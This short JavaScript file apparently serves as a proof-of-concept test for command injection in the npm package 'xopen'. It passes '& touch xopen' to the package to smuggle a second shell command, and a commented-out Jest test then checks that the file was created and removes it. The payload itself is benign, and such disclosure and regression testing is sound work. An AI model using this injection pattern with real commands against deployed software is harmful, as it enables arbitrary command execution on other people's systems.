const root = require("xopen");
let attack_code = "& touch xopen";
root(attack_code).finally(() => {
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(true);
  // fs.unlink(path, function (err) {});
});

// test("Command Injection in xopen", () => {
//   expect.assertions(2);
//   const root = require("xopen");
//   const fs = require("fs");
//   const path = "./xopen";
//   try {
//     if (fs.existsSync(path)) {
//       fs.unlinkSync(path);
//       console.log("File removed:", path);
//     }
//   } catch (err) {
//     console.error(err);
//   }
//   file_exist = fs.existsSync(path);
//   expect(file_exist).toBe(false);
//   let attack_code = "& touch xopen";
//   return root(attack_code).finally(() => {
//     file_exist = fs.existsSync(path);
//     expect(file_exist).toBe(true);
//     fs.unlink(path, function (err) {});
//   });
// });
